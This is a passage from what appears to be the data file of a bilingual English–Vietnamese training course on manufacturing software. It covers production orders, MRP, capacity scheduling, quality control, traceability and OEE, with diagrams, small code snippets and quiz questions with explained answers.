VI: Một công đoạn có thể có tổ máy thay thế, với thời gian riêng không?`,`Can we set the capacity of HAND-1 to unlimited in the system?
VI: Có thể đặt năng lực của HAND-1 là không giới hạn không?`,`Can the planner type the trimming time into the BOM instead?
VI: Kế hoạch có thể nhập thời gian cắt vào BOM thay thế không?`],answer:1,why:`Real plants often have an alternative work center with a different speed and cost. The data model must support it before planning can use it. Unlimited capacity only hides the problem.
VI: Nhà máy thực tế thường có tổ máy thay thế, với tốc độ và chi phí khác. Mô hình dữ liệu phải hỗ trợ điều này thì kế hoạch mới dùng được. Đặt năng lực không giới hạn chỉ che giấu vấn đề.`}]},{id:"manufacturing.orders",title:"Production orders · Lệnh sản xuất",summary:`One order: make this many of this item by this date.
VI: Một lệnh: sản xuất bao nhiêu, mã hàng nào, xong trước ngày nào.`,minutes:5,blocks:[{type:"text",text:`A **production order** says: make this quantity of this item by this date. Most systems copy the BOM and routing into the order. Later BOM changes then do not move a running order.
VI: **Lệnh sản xuất** cho biết: làm bao nhiêu, mã hàng nào, xong trước ngày nào. Đa số hệ thống sao chép BOM và routing vào lệnh. Nhờ vậy, BOM thay đổi sau đó không làm xáo trộn lệnh đang chạy.`},{type:"diagram",text:`Planned ──► Released ──► In progress
(MRP        (approved,   (output is
 proposal)   material     reported)
             can move)        │
                              ▼
Closed  ◄─────────────── Completed
(no more postings,       (all qty done,
 cost is final)           FG received)`},{type:"text",text:`Two stock movements matter most. **Material issue** moves components from the warehouse to the order. **Finished goods receipt** puts the made products into stock.
VI: Hai nghiệp vụ kho quan trọng nhất. **Xuất nguyên vật liệu** cho lệnh (phiếu xuất kho sản xuất). **Nhập kho thành phẩm** khi hàng làm xong (phiếu nhập kho thành phẩm).`},{type:"diagram",text:` RM store      Order PO-881     FG store
┌────────┐    ┌──────────┐    ┌────────┐
│Resin   │───►│ COVER-A  │───►│ 980 pcs│
│Pigment │ (1)│ 1,000 pcs│ (2)│ good   │
└────────┘    └────┬─────┘    └────────┘
                   ├──► Scrap: 20 pcs NG
                   └──► By-product:
                        regrind 3 kg

(1) material issue   (2) FG receipt`},{type:"text",text:`**Scrap** is bad output that is thrown away or sold as waste. A **by-product** is extra output that still has value. For example, runners are ground into regrind and reused. Record both, or stock and cost will be wrong.
VI: **Phế phẩm** là hàng hỏng bị hủy hoặc bán phế liệu. **Phụ phẩm** là đầu ra phụ vẫn còn giá trị. Ví dụ, đường dẫn nhựa được nghiền lại để dùng tiếp. Phải ghi nhận cả hai, nếu không tồn kho và giá thành sẽ sai.`},{type:"text",text:`**Backflushing**: when output is reported, the system issues components automatically from the BOM. It saves scanning, but a wrong BOM means wrong stock.
VI: **Backflush**: khi báo cáo sản lượng, hệ thống tự trừ vật tư theo định mức BOM. Đỡ công quét mã, nhưng BOM sai thì tồn kho cũng sai.`},{type:"example",title:"Closing an order at month end",text:`Accounting asks why PO-881 used 540 kg of resin, not 520 kg. The 20 kg difference is a **variance**. Someone must explain it before the order is closed. After closing, no more issues or receipts are allowed.
VI: Kế toán hỏi vì sao PO-881 dùng 540 kg nhựa thay vì 520 kg. 20 kg chênh lệch đó gọi là **variance** (chênh lệch định mức). Phải giải thích được trước khi đóng lệnh. Sau khi đóng, không được xuất hay nhập thêm cho lệnh.`},{type:"list",items:[`Over-receipt: the order is for 1,000, but 1,020 are good. Allowed? Up to what %?
VI: Nhập vượt: lệnh 1.000 nhưng có 1.020 hàng đạt. Có cho phép không? Tối đa bao nhiêu %?`,`Partial output: 600 today, 400 next week. The order stays In progress.
VI: Báo cáo từng phần: hôm nay 600, tuần sau 400. Lệnh vẫn ở trạng thái đang sản xuất.`,`Ask: can a closed order be reopened? Its cost may already be in the books.
VI: Hỏi: lệnh đã đóng có được mở lại không? Giá thành có thể đã hạch toán vào sổ.`]}],remember:`Release → issue material → report output → receive finished goods → explain variance → close.
VI: Phát hành → xuất vật tư → báo sản lượng → nhập kho thành phẩm → giải trình chênh lệch → đóng lệnh.`,questions:[{id:"manufacturing.orders.1",kind:"mcq",difficulty:"easy",prompt:`From which status should the warehouse be allowed to issue material to an order?
VI: Từ trạng thái nào thì kho được phép xuất vật tư cho lệnh?`,choices:["Planned","Released","Completed","Closed"],answer:1,why:`Planned is only a proposal from MRP and may still change. Released means the order is approved to start, so material can move.
VI: Planned chỉ là đề xuất của MRP và có thể còn thay đổi. Released nghĩa là lệnh đã được duyệt để bắt đầu, nên vật tư có thể được xuất.`},{id:"manufacturing.orders.2",kind:"debug",difficulty:"hard",prompt:`Resin stock in the system is negative, but the warehouse shelf still has resin. The plant uses backflushing. What is the most likely cause?
VI: Tồn kho nhựa trên hệ thống bị âm, nhưng trên kệ vẫn còn nhựa. Nhà máy dùng backflush. Nguyên nhân khả dĩ nhất là gì?`,choices:[`Operators reported fewer good pieces than they made
VI: Công nhân báo số hàng đạt ít hơn thực tế`,`The finished goods went into the wrong warehouse
VI: Thành phẩm bị nhập nhầm vào kho khác`,`The BOM quantity per is higher than the real usage
VI: Định mức trong BOM cao hơn mức dùng thực tế`,`The purchase order for resin was cancelled last week
VI: Đơn mua nhựa bị hủy vào tuần trước`],answer:2,why:`Backflush deducts quantity per × reported output. If the BOM says more than the machine really uses, system stock falls faster than real stock. Reporting fewer pieces would do the opposite.
VI: Backflush trừ kho bằng định mức × sản lượng báo cáo. Nếu BOM ghi cao hơn mức máy thật sự dùng, tồn hệ thống giảm nhanh hơn tồn thực tế. Báo thiếu sản lượng thì lại cho kết quả ngược lại.`},{id:"manufacturing.orders.3",kind:"compare",difficulty:"medium",prompt:`An assembly line uses 20,000 cheap screws a day. How should the screws be issued to orders?
VI: Một chuyền lắp ráp dùng 20.000 con vít giá rẻ mỗi ngày. Nên xuất vít cho lệnh theo cách nào?`,choices:[`Backflush them from the BOM when output is reported
VI: Backflush theo BOM khi báo cáo sản lượng`,`Scan each box of screws at material issue for each order
VI: Quét từng hộp vít khi xuất kho cho từng lệnh`],answer:0,why:`For cheap, high-volume parts, backflushing saves a lot of work. Expensive or lot-tracked parts are usually issued by scanning, for accuracy.
VI: Với vật tư rẻ, dùng số lượng lớn, backflush tiết kiệm nhiều công sức. Vật tư đắt hoặc cần quản lý theo lô thường được xuất bằng cách quét mã cho chính xác.`},{id:"manufacturing.orders.4",kind:"scenario",difficulty:"medium",prompt:`An order is for 1,000 covers. Operators report 1,030 good covers. The system rejects the receipt, and the production manager is upset. What should the developer do?
VI: Lệnh 1.000 nắp. Công nhân báo 1.030 nắp đạt. Hệ thống từ chối nhập kho, quản lý sản xuất không hài lòng. Developer nên làm gì?`,choices:[`Remove the check, so any quantity can be received
VI: Bỏ kiểm tra để nhập số lượng bao nhiêu cũng được`,`Tell the operators to throw away the extra 30 covers
VI: Bảo công nhân bỏ đi 30 nắp dư`,`Ask the business for an over-receipt limit, for example 5%
VI: Hỏi nghiệp vụ về mức cho phép nhập vượt, ví dụ 5%`,`Change the order quantity to 1,030 without a record
VI: Sửa số lượng lệnh thành 1.030 mà không lưu vết`],answer:2,why:`Small overproduction is normal, but unlimited receipts hide mistakes. A limit agreed with the business handles both. The limit is a business rule, not a developer guess.
VI: Sản xuất dư một chút là bình thường, nhưng cho nhập không giới hạn sẽ che giấu sai sót. Một mức giới hạn do nghiệp vụ quyết định giải quyết được cả hai. Đó là quy tắc nghiệp vụ, không phải developer tự đoán.`}]},{id:"manufacturing.mrp",title:"MRP: what to make and buy · MRP: hoạch định nhu cầu vật tư",summary:`From demand to a list of orders, week by week.
VI: Từ nhu cầu ra danh sách lệnh sản xuất và đơn mua theo từng tuần.`,minutes:5,blocks:[{type:"text",text:`**MRP** (material requirements planning) answers three questions. What should we make or buy? How many? When must we start?
VI: **MRP** (hoạch định nhu cầu vật tư) trả lời ba câu hỏi. Cần làm hoặc mua gì? Bao nhiêu? Khi nào phải bắt đầu?`},{type:"diagram",text:`Gross requirement  (sales orders, forecast)
 − on hand         (stock we can use)
 − open orders     (already ordered, coming)
 + safety stock    (buffer set by business)
 = net requirement
 → go back by lead time → start date`},{type:"diagram",text:`COVER-A        lead time 1 week
Week              1     2     3     4
Gross req         -     -     -  1000
On hand 300
Open order        -     -     -   200
Net req           -     -     -   500
Planned start     -     -   500     -

RESIN-PP   52 g/cover, lead time 2 weeks
Need in week 3: 500 x 52 g = 26 kg
Order to supplier in week 1`},{type:"text",text:`Net requirement is 1,000 − 300 − 200 = 500. Making covers takes 1 week, so the order starts in week 3. Then MRP goes down the BOM. Resin must arrive by week 3, and buying takes 2 weeks.
VI: Nhu cầu ròng là 1.000 − 300 − 200 = 500. Làm nắp mất 1 tuần nên lệnh bắt đầu ở tuần 3. Sau đó MRP đi xuống theo BOM. Nhựa phải về trước tuần 3, mà mua mất 2 tuần.`},{type:"code",code:{lang:"ts",text:`function netReq(gross: number, onHand: number,
                openOrders: number, safety = 0) {
  return Math.max(0,
    gross - onHand - openOrders + safety);
}`}},{type:"example",title:"Bad data in, bad plan out",text:`MRP is only as good as its data. A clerk receives 2 tons of resin but posts the receipt three days later. MRP runs every night and sees no resin. It suggests buying 2 more tons, and purchasing follows the plan. Now cash is stuck in extra stock.
VI: MRP chỉ đúng khi dữ liệu đúng. Thủ kho nhận 2 tấn nhựa nhưng ba ngày sau mới nhập phiếu. MRP chạy mỗi đêm và không thấy nhựa. Nó đề xuất mua thêm 2 tấn, và phòng mua hàng làm theo. Thế là tiền bị chôn vào hàng tồn dư.`},{type:"list",items:[`BOM and scrap factors: a wrong BOM gives wrong quantities.
VI: BOM và tỷ lệ hao hụt: BOM sai thì số lượng sai.`,`Stock status: stock in QC hold is usually not available.
VI: Trạng thái tồn kho: hàng đang chờ kiểm thường chưa được tính là có sẵn.`,`Open orders: a late supplier date hides a shortage.
VI: Đơn đang mở: ngày giao sai của nhà cung cấp che giấu việc thiếu hàng.`,`Lead times and lot sizes: for example, resin comes only in 25 kg bags.
VI: Thời gian chờ và quy cách lô: ví dụ, nhựa chỉ bán theo bao 25 kg.`]}],remember:`Net = gross − stock − open orders + safety stock, then go back by lead time. Bad data in, bad plan out.
VI: Nhu cầu ròng = tổng nhu cầu − tồn kho − đơn đang mở + tồn kho an toàn, rồi lùi theo thời gian chờ. Dữ liệu sai thì kế hoạch sai.`,questions:[{id:"manufacturing.mrp.1",kind:"code",difficulty:"easy",prompt:"Using the `netReq` function from the lesson, what does this call return?\nVI: Dùng hàm `netReq` trong bài, lời gọi này trả về bao nhiêu?",code:{lang:"ts",text:`// gross 800, on hand 250,
// open orders 300, safety stock 100
netReq(800, 250, 300, 100);`},choices:["250","450","150","350"],answer:3,why:`800 − 250 − 300 + 100 = 350. Safety stock is added, because the business wants that buffer left over.
VI: 800 − 250 − 300 + 100 = 350. Tồn kho an toàn được cộng thêm vì nghiệp vụ muốn giữ lại phần dự phòng đó.`},{id:"manufacturing.mrp.2",kind:"mcq",difficulty:"medium",prompt:`Covers are due in week 6. Making them takes 2 weeks. Resin has a 3-week purchase lead time. In which week must resin be ordered at the latest?
VI: Nắp cần giao vào tuần 6. Sản xuất mất 2 tuần. Mua nhựa mất 3 tuần. Muộn nhất phải đặt mua nhựa vào tuần nào?`,choices:["Week 3","Week 1","Week 4","Week 6"],answer:1,why:`Production must start in week 6 − 2 = 4, and resin must be there by then. Buying takes 3 weeks, so order in week 4 − 3 = 1.
VI: Sản xuất phải bắt đầu ở tuần 6 − 2 = 4, và nhựa phải có trước lúc đó. Mua mất 3 tuần nên phải đặt ở tuần 4 − 3 = 1.`},{id:"manufacturing.mrp.3",kind:"debug",difficulty:"medium",prompt:`MRP suggests buying 2 tons of resin. The warehouse has 3 tons on the shelf, received and posted yesterday. What is the most likely reason?
VI: MRP đề xuất mua 2 tấn nhựa. Kho đang có 3 tấn trên kệ, đã nhận và nhập phiếu hôm qua. Lý do khả dĩ nhất là gì?`,choices:[`MRP ignores all stock received in the last 7 days
VI: MRP bỏ qua mọi hàng nhận trong 7 ngày gần nhất`,`The lot still waits for IQC, so it is not available
VI: Lô hàng còn chờ IQC nên chưa được tính là có sẵn`,`The resin BOM line has a scrap factor of 4%
VI: Dòng BOM nhựa có tỷ lệ hao hụt 4%`,`Someone deleted the sales forecast by mistake
VI: Ai đó đã xóa nhầm dự báo bán hàng`],answer:1,why:`Many systems do not count stock in quality inspection as available. After incoming inspection passes the lot, MRP will count it. Check stock status before blaming the MRP logic.
VI: Nhiều hệ thống không tính hàng đang kiểm tra chất lượng là hàng có sẵn. Khi IQC đạt, MRP sẽ tính lô đó. Hãy kiểm tra trạng thái tồn kho trước khi nghi ngờ logic MRP.`},{id:"manufacturing.mrp.4",kind:"scenario",difficulty:"hard",prompt:`Net requirement for pigment is 26 kg. The supplier sells only 25 kg bags. What should the planned purchase quantity be?
VI: Nhu cầu ròng của hạt màu là 26 kg. Nhà cung cấp chỉ bán bao 25 kg. Số lượng đề xuất mua nên là bao nhiêu?`,choices:["26 kg","25 kg","50 kg","30 kg"],answer:2,why:`One bag is too little, and the supplier cannot sell 26 kg. Round up to 2 bags = 50 kg. Lot size rules like this belong in the item or supplier data.
VI: Một bao thì thiếu, mà nhà cung cấp không bán lẻ 26 kg. Làm tròn lên 2 bao = 50 kg. Quy tắc lô như vậy cần lưu trong dữ liệu mã hàng hoặc nhà cung cấp.`}]},{id:"manufacturing.capacity",title:"Capacity and scheduling · Năng lực và lập lịch sản xuất",summary:`Can the machines really do the plan?
VI: Máy móc có thật sự làm kịp kế hoạch không?`,minutes:4,blocks:[{type:"text",text:`**Capacity** is how many hours a work center can work. **Load** is how many hours the orders need from it.
VI: **Năng lực** (capacity) là số giờ một tổ máy có thể làm. **Tải** (load) là số giờ mà các lệnh cần ở tổ máy đó.`},{type:"example",title:"One molding machine",text:`Machine IM-03 runs 2 shifts of 8 hours, 6 days a week. That is 96 hours. Planned maintenance takes 6 hours. So capacity is 90 hours per week.
VI: Máy IM-03 chạy 2 ca, mỗi ca 8 giờ, 6 ngày mỗi tuần. Tức là 96 giờ. Bảo trì định kỳ mất 6 giờ. Vậy năng lực là 90 giờ mỗi tuần.`},{type:"diagram",text:`Load on IM-03, capacity 90 h/week
                         │90 h
Wk 1 ████████████████    │      72 h
Wk 2 ████████████████████│      90 h
Wk 3 ████████████████████│████ 108 h ◄
Wk 4 ██████████          │      45 h
Week 3 is overloaded: 120%`},{type:"text",text:`The **bottleneck** is the work center with the least spare capacity. The factory cannot produce more than its bottleneck. An hour lost there is an hour lost for the whole factory.
VI: **Điểm nghẽn** (bottleneck) là tổ máy ít dư năng lực nhất. Nhà máy không thể sản xuất nhiều hơn điểm nghẽn. Mất một giờ ở đó là mất một giờ của cả nhà máy.`},{type:"diagram",text:`Mold      Trim      Paint     Pack
120/h ──► 300/h ──► 80/h ──►  400/h
                     ▲
                bottleneck
Factory output: 80 covers/h at most`},{type:"compare",left:{title:"Infinite capacity",items:[`Plans as if machines never fill up
VI: Lập kế hoạch như thể máy không bao giờ đầy`,`Simple and fast; classic MRP works this way
VI: Đơn giản, nhanh; MRP truyền thống làm như vậy`,`Shows overloads; the planner fixes them by hand
VI: Hiện quá tải; người lập kế hoạch tự xử lý`]},right:{title:"Finite capacity",items:[`Never loads more than capacity
VI: Không xếp tải vượt năng lực`,`Moves orders later when a machine is full
VI: Dời lệnh về sau khi máy đã đầy`,`Needs correct calendars, shifts and times
VI: Cần lịch, ca và thời gian chuẩn xác`]}},{type:"text",text:`A **rush order** (urgent order) jumps the queue. In finite scheduling, it pushes other orders later. Other customers may now be late. The system should show who is affected before the planner confirms.
VI: **Đơn gấp** được ưu tiên chen lên trước. Khi lập lịch theo năng lực hữu hạn, nó đẩy các lệnh khác lùi lại. Khách hàng khác có thể bị trễ. Hệ thống nên cho thấy ai bị ảnh hưởng trước khi người lập kế hoạch xác nhận.`},{type:"list",items:[`Ask: which orders may move, and which are frozen (fixed)?
VI: Hỏi: lệnh nào được dời, lệnh nào bị khóa (cố định)?`,`Ask: is overtime or a Sunday shift allowed? Who approves it?
VI: Hỏi: có được tăng ca hoặc làm Chủ nhật không? Ai duyệt?`,`Ask: does setup depend on the order of jobs? For example, light colors before dark colors.
VI: Hỏi: thời gian chuẩn bị có phụ thuộc thứ tự lệnh không? Ví dụ chạy màu sáng trước màu tối.`]}],remember:`Keep load within capacity. The bottleneck sets the speed of the whole factory.
VI: Giữ tải trong giới hạn năng lực. Điểm nghẽn quyết định tốc độ của cả nhà máy.`,questions:[{id:"manufacturing.capacity.1",kind:"mcq",difficulty:"easy",prompt:`IM-03 has 90 hours of capacity next week. The orders need 108 hours. What is the load in percent?
VI: IM-03 có năng lực 90 giờ tuần tới. Các lệnh cần 108 giờ. Tải là bao nhiêu phần trăm?`,choices:["83%","108%","100%","120%"],answer:3,why:`Load ÷ capacity = 108 ÷ 90 = 1.2, so 120%. The extra 18 hours must move, or the plant needs overtime.
VI: Tải ÷ năng lực = 108 ÷ 90 = 1,2, tức là 120%. 18 giờ dư phải dời đi, hoặc nhà máy phải tăng ca.`},{id:"manufacturing.capacity.2",kind:"perf",difficulty:"medium",prompt:`Output is stuck at 80 covers per hour. Mold does 120/h, paint 80/h, pack 400/h. The manager wants a faster packing machine. What do you say?
VI: Sản lượng dừng ở 80 nắp/giờ. Ép 120/giờ, sơn 80/giờ, đóng gói 400/giờ. Quản lý muốn mua máy đóng gói nhanh hơn. Bạn nói gì?`,choices:[`Good idea, because a faster last step pulls work through
VI: Ý hay, vì bước cuối nhanh hơn sẽ kéo hàng đi nhanh hơn`,`Packing is not the limit; more paint capacity raises output
VI: Đóng gói không phải giới hạn; tăng năng lực sơn mới tăng sản lượng`,`Buy a faster molding machine, because molding is first
VI: Mua máy ép nhanh hơn, vì ép là bước đầu tiên`,`Nothing can change, because 80/h is the design speed
VI: Không thể thay đổi, vì 80/giờ là tốc độ thiết kế`],answer:1,why:`Paint is the bottleneck at 80/h. Packing already has lots of spare capacity, so a faster packer adds nothing. Improve the bottleneck first.
VI: Sơn là điểm nghẽn với 80/giờ. Đóng gói đang dư năng lực nhiều, nên máy nhanh hơn không giúp gì. Hãy cải thiện điểm nghẽn trước.`},{id:"manufacturing.capacity.3",kind:"compare",difficulty:"medium",prompt:`The shop floor needs a schedule for next week that it can really follow. Which approach is better?
VI: Xưởng cần lịch sản xuất tuần tới mà thực sự làm theo được. Cách nào tốt hơn?`,choices:[`Infinite capacity: plan by due date and ignore machine limits
VI: Năng lực vô hạn: xếp theo ngày giao, bỏ qua giới hạn máy`,`Finite capacity: load each machine only up to its hours
VI: Năng lực hữu hạn: chỉ xếp tải mỗi máy đến số giờ nó có`],answer:1,why:`An infinite plan can put 108 hours on a 90-hour machine. That is fine for a rough plan, but not for a real schedule. Finite scheduling gives dates the floor can meet.
VI: Kế hoạch vô hạn có thể xếp 108 giờ cho máy chỉ có 90 giờ. Điều đó ổn cho kế hoạch sơ bộ, nhưng không dùng được cho lịch thực tế. Lập lịch hữu hạn cho ra ngày mà xưởng làm kịp.`},{id:"manufacturing.capacity.4",kind:"scenario",difficulty:"hard",prompt:`Sales enters a rush order for a big customer. Finite scheduling moves 3 orders of other customers 2 days later. What should the system do before saving?
VI: Kinh doanh nhập một đơn gấp cho khách lớn. Lập lịch hữu hạn dời 3 lệnh của khách khác trễ 2 ngày. Hệ thống nên làm gì trước khi lưu?`,choices:[`Save it silently, since the scheduler found the best plan
VI: Lưu luôn, vì bộ lập lịch đã tìm ra phương án tốt nhất`,`Reject the rush order, because this week is already planned
VI: Từ chối đơn gấp, vì tuần này đã có kế hoạch`,`Email every customer at once that their orders will be late
VI: Gửi email ngay cho mọi khách rằng đơn của họ sẽ trễ`,`Show the affected orders and dates, then ask to confirm
VI: Hiện các lệnh và ngày bị ảnh hưởng, rồi yêu cầu xác nhận`],answer:3,why:`A rush order is a trade-off between customers. A person must see the impact and decide. Saving silently or emailing customers automatically skips that decision.
VI: Đơn gấp là sự đánh đổi giữa các khách hàng. Phải có người xem ảnh hưởng và quyết định. Lưu ngầm hay tự gửi email cho khách đều bỏ qua bước quyết định đó.`}]},{id:"manufacturing.quality",title:"Quality control · Kiểm soát chất lượng",summary:`Check at the door, on the line and before shipping.
VI: Kiểm tra khi nhận hàng, trên chuyền và trước khi xuất hàng.`,minutes:4,blocks:[{type:"diagram",text:`Supplier                     Customer
   │                             ▲
   ▼                             │
┌──────┐   ┌──────────┐   ┌──────┐
│ IQC  │──►│  IPQC    │──►│ OQC  │
│input │   │in-process│   │output│
└──────┘   └──────────┘   └──────┘
 đầu vào    trong quá      đầu ra
            trình`},{type:"text",text:`**IQC** checks materials when they arrive. **IPQC** checks parts on the line while they are made. **OQC** checks finished goods before shipping.
VI: **IQC** kiểm tra đầu vào khi vật tư về. **IPQC** kiểm tra trong quá trình sản xuất trên chuyền. **OQC** kiểm tra đầu ra trước khi xuất hàng.`},{type:"text",text:`Each check gives **OK** (pass) or **NG** (no good, fail). NG items go to a separate, marked area. They must never mix with OK stock.
VI: Mỗi lần kiểm cho kết quả **OK** (đạt) hoặc **NG** (không đạt). Hàng NG được để ở khu riêng, có dán nhãn. Không bao giờ được để lẫn với hàng OK.`},{type:"example",title:"Defect rate in ppm",text:`Many customers measure defects in **ppm** (parts per million). You shipped 50,000 covers, and the customer found 15 NG. Defect rate = 15 ÷ 50,000 × 1,000,000 = 300 ppm. If the target is 100 ppm, this month failed.
VI: Nhiều khách hàng đo tỷ lệ lỗi bằng **ppm** (số lỗi trên một triệu sản phẩm). Bạn giao 50.000 nắp, khách phát hiện 15 cái NG. Tỷ lệ lỗi = 15 ÷ 50.000 × 1.000.000 = 300 ppm. Nếu mục tiêu là 100 ppm thì tháng này không đạt.`},{type:"compare",left:{title:"Rework · Sửa lại",items:[`The part can be fixed, for example re-painted
VI: Hàng sửa được, ví dụ sơn lại`,`Needs a rework step, time and cost
VI: Cần thêm công đoạn sửa, thời gian và chi phí`,`Must be inspected again after the fix
VI: Phải kiểm tra lại sau khi sửa`]},right:{title:"Scrap · Hủy",items:[`Cannot be fixed, or fixing costs too much
VI: Không sửa được, hoặc sửa quá tốn kém`,`Removed from stock with a reason code
VI: Trừ khỏi tồn kho kèm mã lý do`,`Counted as a loss in cost reports
VI: Ghi nhận là tổn thất trong báo cáo giá thành`]}},{type:"text",text:`**8D** (eight disciplines) is a team method for serious problems. Contain it, find the root cause, fix it, and stop it from coming back.
VI: **8D** là phương pháp xử lý sự cố nghiêm trọng theo 8 bước. Khoanh vùng, tìm nguyên nhân gốc, khắc phục và ngăn không cho tái diễn.`},{type:"list",items:["Stock status: `Available`, `QC hold`, `Blocked`. Only available stock can be issued or shipped.\nVI: Trạng thái tồn: `Available` (sẵn dùng), `QC hold` (chờ kiểm), `Blocked` (khóa). Chỉ hàng sẵn dùng mới được xuất.",`Inspection record: lot, sample size, OK qty, NG qty, defect code, inspector, time.
VI: Phiếu kiểm tra: lô, cỡ mẫu, số OK, số NG, mã lỗi, người kiểm, thời gian.`,`Ask: if a sample fails, is the whole lot NG, or do we sort 100%?
VI: Hỏi: nếu mẫu không đạt, cả lô bị NG hay phải tuyển lại 100%?`,`Ask: who may release a blocked lot, and must they give a reason?
VI: Hỏi: ai được mở khóa một lô bị khóa, và có bắt buộc ghi lý do không?`]}],remember:`Check at three points, keep NG apart, and let only released stock move.
VI: Kiểm ở ba điểm, tách riêng hàng NG, và chỉ cho hàng đã được duyệt di chuyển.`,questions:[{id:"manufacturing.quality.1",kind:"mcq",difficulty:"easy",prompt:`A delivery of resin is checked before it goes onto the warehouse shelf. Which check is this?
VI: Một lô nhựa được kiểm tra trước khi lên kệ kho. Đây là khâu kiểm tra nào?`,choices:["IPQC","IQC","OQC","8D"],answer:1,why:`IQC is incoming quality control: checking materials from suppliers. IPQC happens on the line, OQC before shipping.
VI: IQC là kiểm tra chất lượng đầu vào, tức kiểm vật tư từ nhà cung cấp. IPQC diễn ra trên chuyền, OQC trước khi xuất hàng.`},{id:"manufacturing.quality.2",kind:"code",difficulty:"medium",prompt:`What does this call return?
VI: Lời gọi này trả về bao nhiêu?`,code:{lang:"ts",text:`function ppm(ng: number, total: number) {
  return (ng * 1_000_000) / total;
}
ppm(6, 20_000);`},choices:["30","3,000","0.03","300"],answer:3,why:`6 × 1,000,000 ÷ 20,000 = 300. That means 300 bad parts per million, or 0.03%.
VI: 6 × 1.000.000 ÷ 20.000 = 300. Tức là 300 sản phẩm lỗi trên một triệu, hay 0,03%.`},{id:"manufacturing.quality.3",kind:"debug",difficulty:"hard",prompt:`A customer finds NG covers from lot C-0712. The IPQC result for that lot was NG, but the lot was still shipped. What is the most likely system gap?
VI: Khách phát hiện nắp NG thuộc lô C-0712. Kết quả IPQC của lô đó là NG, nhưng lô vẫn được xuất. Lỗ hổng hệ thống khả dĩ nhất là gì?`,choices:[`The ppm formula divides by the wrong total
VI: Công thức ppm chia sai tổng số lượng`,`An NG result does not block the lot from shipping
VI: Kết quả NG không khóa lô khỏi việc xuất hàng`,`The BOM version had no effective date
VI: Phiên bản BOM không có ngày hiệu lực`,`The inspector logged the result in the morning
VI: Người kiểm ghi kết quả vào buổi sáng`],answer:1,why:`The inspection result is stored, but it is not linked to the stock status. An NG result should set the lot to Blocked, so picking and shipping refuse it.
VI: Kết quả kiểm tra có lưu nhưng không gắn với trạng thái tồn kho. Kết quả NG phải chuyển lô sang Blocked, để soạn hàng và xuất hàng từ chối lô đó.`},{id:"manufacturing.quality.4",kind:"scenario",difficulty:"medium",prompt:`200 covers have small paint bubbles. Re-painting costs, for example, 2,000 VND each, and a new cover costs 15,000 VND. Quality says rework is safe. What should the system support?
VI: 200 nắp bị bọt sơn nhỏ. Ví dụ sơn lại tốn 2.000 đồng mỗi cái, còn nắp mới là 15.000 đồng. QC nói sửa lại là an toàn. Hệ thống nên hỗ trợ gì?`,choices:[`A rework step, then a second inspection before stock
VI: Công đoạn sửa lại, rồi kiểm tra lại trước khi nhập kho`,`Scrap all 200, because NG parts are always thrown away
VI: Hủy cả 200, vì hàng NG lúc nào cũng phải bỏ`,`Mark the 200 as OK now, since they will be fixed later
VI: Đánh dấu 200 cái là OK luôn, vì sau này sẽ sửa`,`Ship them, because 200 of 50,000 is under 1%
VI: Cứ giao, vì 200 trên 50.000 là dưới 1%`],answer:0,why:`Rework is cheaper here, but a fixed part is not OK until it is checked again. Marking them OK early lets NG parts reach stock.
VI: Ở đây sửa lại rẻ hơn, nhưng hàng đã sửa chưa phải là OK cho đến khi kiểm lại. Đánh dấu OK sớm sẽ để hàng NG lọt vào kho.`}]},{id:"manufacturing.traceability-oee",title:"Traceability and OEE · Truy xuất nguồn gốc và OEE",summary:`Know where every lot went, and how well each machine runs.
VI: Biết từng lô đã đi đâu, và mỗi máy chạy hiệu quả đến mức nào.`,minutes:5,blocks:[{type:"text",text:`**Traceability** means you can follow a lot from raw material to the customer, and back. A **lot** is a group of items made or received together.
VI: **Truy xuất nguồn gốc** là theo dõi được một lô từ nguyên liệu đến khách hàng, và theo chiều ngược lại. **Lô** là nhóm hàng được sản xuất hoặc nhận về cùng một lần.`},{type:"diagram",text:`Resin R-501      Pigment P-77
      │               │
      └──────┬────────┘
             ▼
   Order PO-881 on IM-03
             ▼
    Cover lot C-0712
      ┌──────┴────────┐
      ▼               ▼
 Ship SH-301     Ship SH-305
 Customer A      Customer B

Forward  ↓ : bad resin → which customers?
Backward ↑ : complaint → which resin lot?`},{type:"example",title:"A supplier warning",text:`The supplier says resin lot R-501 was contaminated. With traceability, one query finds cover lot C-0712 and 2 shipments. Without it, the plant may have to recall a whole month of covers.
VI: Nhà cung cấp báo lô nhựa R-501 bị nhiễm tạp chất. Có truy xuất, một câu truy vấn tìm ra lô nắp C-0712 và 2 chuyến giao. Không có, nhà máy có thể phải thu hồi hàng của cả tháng.`},{type:"code",code:{lang:"sql",text:`-- Forward trace: who got resin lot R-501?
SELECT DISTINCT s.CustomerId
FROM LotConsumption c
JOIN LotOutput o    ON o.OrderId = c.OrderId
JOIN ShipmentLine s ON s.LotNo = o.LotNo
WHERE c.LotNo = 'R-501';
-- multi-level BOM: repeat per level
-- (a recursive query)`}},{type:"text",text:`**OEE** (overall equipment effectiveness) shows how much planned time made good parts at full speed. OEE = availability × performance × quality.
VI: **OEE** (hiệu suất thiết bị tổng thể) cho biết bao nhiêu phần thời gian kế hoạch tạo ra hàng đạt ở tốc độ chuẩn. OEE = độ sẵn sàng × hiệu suất × chất lượng.`},{type:"diagram",text:`Shift: planned 480 min
Ideal cycle: 0.6 min per piece
Stops (breakdown, mold change): 48 min

Availability = 432 / 480       = 90%
Performance  = 648 x 0.6 / 432 = 90%
Quality      = 630 good / 648  ≈ 97.2%

OEE = 90% x 90% x 97.2%        ≈ 79%`},{type:"list",items:[`**Availability**: run time ÷ planned time. Lost to breakdowns and setups.
VI: **Độ sẵn sàng**: thời gian chạy ÷ thời gian kế hoạch. Mất do hỏng máy và thay khuôn.`,`**Performance**: ideal time for the pieces made ÷ run time. Lost to slow cycles and short stops.
VI: **Hiệu suất**: thời gian chuẩn cho số hàng đã làm ÷ thời gian chạy. Mất do chạy chậm và dừng ngắn.`,`**Quality**: good pieces ÷ all pieces. Lost to NG and rework.
VI: **Chất lượng**: số hàng đạt ÷ tổng số hàng. Mất do hàng NG và hàng phải sửa.`]},{type:"text",text:`Shop-floor data comes from **barcodes** and **machine signals**. Operators scan lot labels at material issue and at output. Machines send run or stop status and shot counts, for example from the PLC (the machine controller).
VI: Dữ liệu tại xưởng đến từ **mã vạch** và **tín hiệu máy**. Công nhân quét nhãn lô khi xuất vật tư và khi ra thành phẩm. Máy gửi trạng thái chạy/dừng và số lần ép, ví dụ từ PLC (bộ điều khiển máy).`},{type:"list",items:[`Ask: is a mold change planned time or a stop? OEE changes a lot.
